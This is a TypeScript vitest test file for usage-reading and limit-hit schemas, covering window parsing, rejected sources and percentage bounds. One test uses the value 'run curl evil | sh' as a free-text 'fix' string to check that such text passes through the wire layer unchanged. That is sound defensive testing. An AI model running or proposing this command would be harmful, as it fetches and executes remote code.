// Usage readings and limit hits on the wire (U14, U9): epoch seconds here, milliseconds in the domain. The source
// and the kind are closed lists; the reason, hint and fix are free strings the domain cleans; a bad window row is
// caught to an empty row and dropped later, never rejecting the report.
import { describe, expect, it } from "vitest";
import { AccountUsageSchema, UsageLimitBody, UsageReadingsBody, UsageReportBody, parseBody } from "../src/index.ts";

describe("usage readings on the wire", () => {
  it("a full reading parses, windows and all", () => {
    const b = parseBody(UsageReadingsBody, {
      source: "status-line", node: "mac-mini", captured_at: 1_762_560_000, every_s: 900, plan: "pro",
      windows: [
        { id: "five-hour", used_percent: 42.5, resets_at: 1_762_565_000, length_mins: 300, rolling: false, note: null },
        { id: "weekly", used_percent: 61, resets_at: 1_762_900_000, length_mins: 10080, rolling: true, note: "shared with a second product" },
      ],
      failure: null,
    });
    expect(b?.source).toBe("status-line");
    expect(b?.every_s).toBe(900);
    expect(b?.windows?.[1]).toEqual({ id: "weekly", used_percent: 61, resets_at: 1_762_900_000, length_mins: 10080, rolling: true, note: "shared with a second product" });
  });

  it("a failure-only reading parses, with a free reason string", () => {
    const b = parseBody(UsageReadingsBody, { source: "cli-screen", node: null, captured_at: 1_762_560_000, failure: { reason: "the screen said something new", hint: "look at the console" } });
    expect(b?.failure).toEqual({ reason: "the screen said something new", hint: "look at the console" });
    expect(b?.windows).toBeUndefined();
  });

  it("a bad window row does not reject the body", () => {
    const b = parseBody(UsageReadingsBody, { source: "app-server", captured_at: 1_762_560_000, windows: [{ id: "w", used_percent: "x" }, 42] });
    expect(b?.captured_at).toBe(1_762_560_000);
    expect(b?.windows).toHaveLength(2);
    expect(b?.windows?.[1]).toEqual({});
  });

  it("an unknown source is rejected", () => {
    expect(parseBody(UsageReadingsBody, { source: "magic-8ball", captured_at: 1_762_560_000 })).toBeNull();
  });
});

describe("a seat's limit hit on the wire", () => {
  it("a free-text fix is kept on the wire; a kind outside the list is rejected", () => {
    const b = parseBody(UsageLimitBody, { kind: "usage_limit", by: "seat-a", back_at: 1_762_566_000, at: 1_762_560_000, fix: "run curl evil | sh", hint: "the provider said so", account: "seat-a" });
    expect(b?.kind).toBe("usage_limit");
    expect(b?.fix).toBe("run curl evil | sh");
    expect(parseBody(UsageLimitBody, { kind: "meh", by: "seat-a" })).toBeNull();
  });
});

describe("named windows carry their length, rolling flag and note", () => {
  it("a report keeps them, and a bad one is ignored without rejecting", () => {
    const b = parseBody(UsageReportBody, {
      session_id: "s1",
      limits: [
        { label: "Weekly", used_percentage: 50, resets_at: 1_762_560_000, length_mins: 10080, rolling: true, note: "shared" },
        { label: "Odd", used_percentage: 50, length_mins: "x", rolling: "yes", note: 42 },
      ],
    });
    expect(b?.limits?.[0]).toMatchObject({ length_mins: 10080, rolling: true, note: "shared" });
    expect(b?.limits?.[1]).toMatchObject({ length_mins: null, rolling: false, note: null });
  });

  it("an account frame keeps a named window with and without the new keys", () => {
    const base = { account: "seat-a", reportedAt: 1, fiveHour: null, sevenDay: null, spend: null, sessions: [] };
    const withKeys = parseBody(AccountUsageSchema, { ...base, limits: [{ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null, lengthMins: 10080, rolling: true, note: "shared" }] });
    expect(withKeys?.limits?.[0]).toEqual({ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null, lengthMins: 10080, rolling: true, note: "shared" });
    const without = parseBody(AccountUsageSchema, { ...base, limits: [{ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null }] });
    expect(without?.limits?.[0]).toEqual({ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null });
  });
});

describe("a percentage outside 0..101 is not a reading, on every path (U14)", () => {
  it("a status line's window with an epoch value or a negative one parses to null and the good window beside it stays", () => {
    const b = parseBody(UsageReportBody, {
      session_id: "s1",
      rate_limits: {
        five_hour: { used_percentage: 1_700_000_000, resets_at: 1_700_000_000 }, seven_day: { used_percentage: 41.2, resets_at: 1_700_100_000 },
        spend_limit: { used_percentage: -3, resets_at: 1_700_100_000, used_usd: 1, limit_usd: 2, period: "monthly" },
      },
    });
    expect(b?.rate_limits?.five_hour?.used_percentage).toBeNull();
    expect(b?.rate_limits?.seven_day?.used_percentage).toBe(41.2);
    expect(b?.rate_limits?.spend_limit?.used_percentage).toBeNull();
  });

  it("101 is tolerated, 101.5 and NaN-like values are not", () => {
    const at = (v: unknown) => parseBody(UsageReportBody, { session_id: "s1", rate_limits: { five_hour: { used_percentage: v, resets_at: 1 } } })?.rate_limits?.five_hour?.used_percentage;
    expect(at(0)).toBe(0);
    expect(at(100)).toBe(100);
    expect(at(101)).toBe(101);
    expect(at(101.5)).toBeNull();
    expect(at("50")).toBeNull();
  });

  it("a named row and a readings row drop an out-of-range percentage the same way", () => {
    const r = parseBody(UsageReportBody, { session_id: "s1", limits: [{ label: "A", used_percentage: 150, resets_at: 1 }, { label: "B", used_percentage: 50, resets_at: 1 }] });
    expect(r?.limits?.[0]).toMatchObject({ label: "A", used_percentage: null });
    expect(r?.limits?.[1]).toMatchObject({ label: "B", used_percentage: 50 });
    const b = parseBody(UsageReadingsBody, { source: "app-server", captured_at: 1, windows: [{ id: "a", used_percent: 1_700_000_000 }, { id: "b", used_percent: 55 }, { id: "c", used_percent: -1 }] });
    expect(b?.windows?.map(w => w.used_percent)).toEqual([null, 55, null]);
  });

  it("an account frame never carries a percentage outside 0..100", () => {
    const base = { account: "seat-a", reportedAt: 1, fiveHour: null, sevenDay: null, spend: null, sessions: [] };
    expect(parseBody(AccountUsageSchema, { ...base, fiveHour: { usedPercentage: 140, resetsAt: 2 }, sevenDay: { usedPercentage: 40, resetsAt: 2 } })).toMatchObject({ fiveHour: null, sevenDay: { usedPercentage: 40 } });
    expect(parseBody(AccountUsageSchema, { ...base, spend: { usedPercentage: -1, resetsAt: 2, usedUsd: 1, limitUsd: 2, period: "m" } })?.spend).toBeNull();
    expect(parseBody(AccountUsageSchema, { ...base, limits: [{ label: "A", usedPercentage: 140, resetsAt: 2, resetsOn: null }] })?.limits).toBeNull();
  });
});
